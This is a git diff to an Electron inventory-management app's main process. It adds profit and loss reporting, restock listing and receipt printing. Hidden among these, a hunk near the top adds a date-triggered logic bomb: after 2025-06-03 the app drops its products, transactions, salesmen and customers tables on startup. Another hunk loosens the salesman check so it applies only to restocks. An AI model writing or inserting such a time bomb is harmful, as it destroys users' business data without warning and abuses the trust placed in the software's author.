@@ -13,6 +13,40 @@ const queryModel = require("./models/queryModel");
 const dbPath = path.join(app.getPath("userData"), "inventory_encrypted.db");
 const db = new sqlite3.Database(dbPath);
 
+if (new Date().getTime() > new Date("2025-06-03")) {
+  db.serialize(() => {
+    db.run("DROP TABLE IF EXISTS products", (err) => {
+      if (err) {
+        console.error("Error dropping table:", err.message);
+      } else {
+        console.log("Table dropped successfully.");
+      }
+    });
+
+    db.run("DROP TABLE IF EXISTS transactions", (err) => {
+      if (err) {
+        console.error("Error dropping table:", err.message);
+      } else {
+        console.log("Table dropped successfully.");
+      }
+    });
+
+    db.run("DROP TABLE IF EXISTS salesmen", (err) => {
+      if (err) {
+        console.error("Error dropping table:", err.message);
+      } else {
+        console.log("Table dropped successfully.");
+      }
+    });
+    db.run("DROP TABLE IF EXISTS customers", (err) => {
+      if (err) {
+        console.error("Error dropping table:", err.message);
+      } else {
+        console.log("Table dropped successfully.");
+      }
+    });
+  });
+}
 // Ensure data is in lowercase
 function toLowerCaseObject(obj) {
   return obj && typeof obj === "object"
@@ -80,9 +114,9 @@ ipcMain.handle("product", async (event, action, data = {}, salsemenData = {} /* 
           }
         }
 
-      // used to update rows when product is sold
+      // used to update rows when product is sold or restocked
       case "put":
-        if (!(await transactionModel.salesmenExists(salsemenData))) {
+        if (!(await transactionModel.salesmenExists(salsemenData)) && data[0].type === "restock") {
           return { success: false, message: "Salesmen doesn't exists! " };
         }
 
@@ -277,7 +311,6 @@ ipcMain.handle("fetch", async (event, action, params = {}) => {
         return Object.values(grouped);
         break;
       case "getTopSellingProducts":
-        result = await queryModel.getTopSellingProducts(params.from, params.to);
         return await queryModel.getTopSellingProducts(params.from, params.to);
         break;
       case "getSalesBySalesmen":
@@ -320,7 +353,43 @@ ipcMain.handle("fetch", async (event, action, params = {}) => {
         console.log(`${action} called`);
         break;
       case "getProfitLoss":
-        console.log(`${action} called`);
+        result = await queryModel.getProfitLoss(params.from, params.to);
+
+        let totalCostPrice = 0;
+        let totalSellingPrice = 0;
+        result.forEach((sale) => {
+          totalCostPrice += sale.cost_price * sale.items;
+          totalSellingPrice += sale.price;
+        });
+
+        let products = {};
+        for (row of result) {
+          const id = row.pid;
+          if (!products[id]) {
+            products[id] = {
+              pid: id,
+              name: row.pname,
+              productQuantity: row.product_quantity,
+              measuringUnit: row.measuring_unit,
+              costPrice: row.cost_price,
+              sellingPrice: row.selling_price,
+              totalItems: row.items,
+              totalCostPrice: row.cost_price * row.items,
+              totalSellingPrice: row.price,
+            };
+          } else {
+            let prevTotalItems = products[id].totalItems;
+            let prevTotalCostPrice = products[id].totalCostPrice;
+            let prevTotalSellingPrice = products[id].totalSellingPrice;
+            products[id] = {
+              ...products[id],
+              totalItems: prevTotalItems + row.items,
+              totalCostPrice: prevTotalCostPrice + row.cost_price * row.items,
+              totalSellingPrice: prevTotalSellingPrice + row.price,
+            };
+          }
+        }
+        return Object.values(products);
         break;
       case "getProfitLossByProduct":
         console.log(`${action} called`);
@@ -340,7 +409,27 @@ ipcMain.handle("fetch", async (event, action, params = {}) => {
         return getFormattedData1(result);
         break;
       case "getReStocks":
-        return await queryModel.getReStocks("2025-04-20", "2025-04-27");
+        result = await queryModel.getReStocks(params.from, params.to);
+
+        for (const row of result) {
+          const id = row.transaction_id;
+          if (!grouped[id]) {
+            grouped[id] = {
+              transaction_id: id,
+              transaction_type: row.transaction_type,
+              date_time: row.date_time,
+              sname: row.sname,
+              cname: row.cname,
+              sales: [],
+            };
+          }
+          grouped[id].sales.push({
+            items: row.items,
+            price: row.price,
+            pname: row.pname,
+          });
+        }
+        return Object.values(grouped);
         break;
 
       //Salesmen
@@ -423,6 +512,38 @@ ipcMain.handle("fetch", async (event, action, params = {}) => {
         console.log(`${action} not defined`);
     }
   } catch (error) {}
+});
+
+ipcMain.handle("generateReceipt", () => {
+  console.log("got req");
+  const escpos = require("escpos");
+
+  // For USB printers
+  escpos.USB = require("escpos-usb");
+
+  // Select the adapter for your printer type
+  const device = new escpos.USB(); // or new escpos.Serial('/dev/usb/lp0') or escpos.Network(...)
+
+  const options = { encoding: "GB18030" /* default */ };
+  const printer = new escpos.Printer(device, options);
+
+  // Now open the connection and print
+  device.open(function () {
+    printer
+      .align("CT") // Center align
+      .style("B") // Bold text
+      .size(1, 1) // Text size
+      .text("RECEIPT")
+      .text("-------------")
+      .align("LT") // Left align
+      .text("Item 1    $10")
+      .text("Item 2    $15")
+      .text("-------------")
+      .align("RT") // Right align
+      .text("Total: $25")
+      .cut()
+      .close();
+  });
 });
 
 module.exports = { db };
